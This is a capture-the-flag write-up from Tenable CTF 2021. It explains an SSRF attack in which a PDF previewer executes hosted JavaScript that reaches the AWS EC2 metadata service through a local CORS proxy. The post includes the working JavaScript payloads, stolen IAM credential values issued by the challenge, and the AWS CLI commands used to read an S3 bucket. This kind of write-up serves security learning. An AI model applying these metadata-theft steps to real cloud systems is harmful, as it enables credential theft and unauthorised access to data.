---
layout: post
title:  "Hacking Toolz - Web"
date:   2021-02-26 12:28:05 +0100
categories: writeups
---

```
Challenge: Hacking Toolz
Author: Shotokhan
Description: SSRF against AWS instance
CTF: Tenable CTF 2021
Category: Web
```


# Writeup
There is a PHP website which offers many features ("hacking tools"). <br>
The first one is a CORS redirector, which is used to fetch XMLHttpRequest in JS. <br>
It appears not publically accessible. <br>
The second feature is "site previewer": it takes an URL as input and returns the rendered page as PDF, executing any JS code found on that page. <br>
This feature points us at the SSRF, but we still don't know what we should look at; an interesting thing is that it executes JS code, so maybe we can make "network pivoting" using XMLHttpRequest and the CORS proxy. <br>
The third feature is the "payload generator", useless for us since it's only client-side. <br>
But there is a link to "Release Notes": it is specified that in the latest update the redirector is no longer publically accessible and that AWS instance was upgraded from S3 to EC2, hiding the "sweet paid content" in S3. <br>
This note points us towards attacking the AWS instance through the SSRF, to get metadata and security credentials for S3. <br>
<br>
The idea is to set up an HTTP server with ngrok, serving an HTML page with a JS script; our malicious payload will be the JS script. <br>
So we do an "Hello world" test, which passes gracefully. <br>
After that, we try to make our target use the CORS redirector on localhost: ```http://127.0.0.1/redir.php?url=[redacted]```
<br>
In the script:
```
const cors_proxy = "http://127.0.0.1/redir.php?url=";
const webhook = "[redacted]";
let http = new XMLHttpRequest();
http.open("GET", cors_proxy + webhook, false);
http.send();
```
The "false" flag in http.open() is to instruct JS to make a synchronous request: you need it if you want the result of the request. <br>
We see the GET request on the webhook, so we got to use the CORS proxy. <br>
Now, to access AWS metadata, we need a token, because we are dealing with EC2. <br>
From: <br>
https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html <br>
We can see that we need to send the following requests in order to access instance's metadata: <br>
```
TOKEN='curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"' \
&& curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/  <br> <br>
```
Therefore we have to make a PUT request to http://169.254.169.254/latest/api/token with the proper header, in order to get the token. <br> 
Usually, CORS proxies only redirect GET requests; we can see with the webhook that this one redirects any method and any header. <br>
At this point, to get the token and to read metadata, the script is:
```
const cors_proxy = "http://127.0.0.1/redir.php?url=";
let http = new XMLHttpRequest();
http.open("PUT", cors_proxy + "http://169.254.169.254/latest/api/token", false);
http.setRequestHeader("X-aws-ec2-metadata-token-ttl-seconds", "21600");
http.send();
document.write("Response text: " + http.responseText + "; " + "Response headers: " + http.getAllResponseHeaders() + '<br>');
let token = http.responseText;
http = new XMLHttpRequest();
http.open("GET", cors_proxy + "http://169.254.169.254/latest/meta-data/", false);
http.setRequestHeader("X-aws-ec2-metadata-token", token);
http.send();
document.write("Metadata: " + http.responseText + "; " + "Response headers: " + http.getAllResponseHeaders() + '<br>');
```
I also included response headers in the PDF for debug purposes, in case something went wrong. <br>
We got this response: <br> <br>
ami-id ami-launch-index ami-manifest-path block-device-mapping/ events/ hibernation/ hostnameiam/ identity-credentials/ instance-action instance-id instance-life-cycle instance-type local-hostname local-ipv4mac metrics/ network/ placement/ profile public-hostname public-ipv4 public-keys/ reservation-id security-groups services/
<br> <br>
After traversing the directory for a while, we remember that S3 is hidden, that's why "iam" doesn't appear in metadata. <br>
But it's still there, we can see it using /latest/meta-data/iam path. Going deeper in that path, we arrived to: <br>
/latest/meta-data/iam/security-credentials/S3Role <br>
Which gave us this response: <br> <br>
```
{"Code":"Success","LastUpdated":"2021-02-22T00:15:46Z","Type":"AWS-HMAC","AccessKeyId":"ASIA5HRVYIWQPMRQS26H","SecretAccessKey":"qu4tsNg6Ka1WHGBi/trVxJeezYuponAXR3Lm4s8b","Token":"IQoJb3JpZ2luX2VjEMD//////////wEaCXVzLWVhc3QtMiJIMEYCIQDo/Yevx3raORjfYNsOSiawG5mBhMBbt334MeeXvB3UwIhAItYJQBFxbYl/sud5CHauYfTV333oJ8SlqbRD7UmXQ0wKr0DCMn//////////wEQABoMOTA5NTcyMDY0NjcyIgz7/T72tr4KvKRQQEkqkQNDFDBph5GE5rEMhhRWE2hittnAVe3z0fUQVtOhvLsp9EjK5vVErOvaqEmlPs3dfNakbxh9znY81oXidCfqfpJDbq8wFdA7ZBFkpCePbz7wzlKU6f2UMVZKcstZvv0xLKgujQWRnSTsj80BEwJlnp5KR/TONMUpzX2RrXL/vDurWJruJzWh/gQVwdfMKdFK25XiXFti2uAxOjcJDPKXszSC6gG4M0nKQtyxqTXHlZpHA8HJ/tI87jsWLge9h3iSr1xShfmdmLL/wFzk0FVODHyDIpTfslgC8cOzYCvaWiX25Yd2qx3bwSAzktgxVnIf1SWslQ7cH/6rqe6CzlerI5wANhxaOSi1YrcQvGnvCHBt8KkF2YswUTkJ3AmtR87QKXbsSXZKV3hKDirGfs0094XuKdu7PmQ8J3JIGqMlcIkc3SxJkZyDcFSqcmLm1AISxFCV6CPY4VCeRyL4evNViasENY28JILZ2PYBTo4yFjnvMvYyATe4Gkv3KnV5kXq8vaL6C9bq3Rch/vOYmAwqLfTCP78uBBjrqAYeF4BumLSMcrc6V4OYmWeH/tpGZ66LQRJdZ3MVFS/Lp/OP2SeR300wBvjEHwgS1BB9wnwhlpYP5ORrJFJrP9tIpUYnbm2ot7h5TdSk0lL66oHqFn5Kcp2qtqqN3e6oEzcMKWRVrGlj3w3ttaJkS7cokG4liCwjJ6gfXK929bK2WfvkAjullZHN69r4avbbOr30Q0o1unjRKSSnb7DVGidhnbFq5/oemWviLrCVXYSluQKoW9PeQxLdMpBcbo7X4A5rJgUPWO3XboJBDfzXwcHD36428xF/7GJ6yXSsMvOPBl/Ku2EG8Ttw==","Expiration":"2021-02-22T06:17:34Z"}
```
<br> <br>
Now, to use these credentials, we need to use the AWS CLI, which can be easily installed. <br>
In the terminal: <br>
```
$ export AWS_ACCESS_KEY_ID=[AccessKeyId]
$ export AWS_SECRET_ACCESS_KEY=[SecretAccessKey]
$ export AWS_SESSION_TOKEN=[Token]
$ aws s3 ls
> ... secretdocs
$ aws s3 ls secretdocs
> ... 241 leviathan.txt
$ aws s3 cp s3://secretdocs/leviathan.txt flag.txt
> download: s3://secretdocs/leviathan.txt to ./flag.txt
$ cat flag.txt
> no sound, once made, is ever truly lost 
in electric clouds, all are safely trapped
and with a touch, if we find them 
we can recapture those echoes of sad, forgotten wars
long summers, and sweet autumns

flag{cl0udy_with_a_chance_0f_flag5} 
```
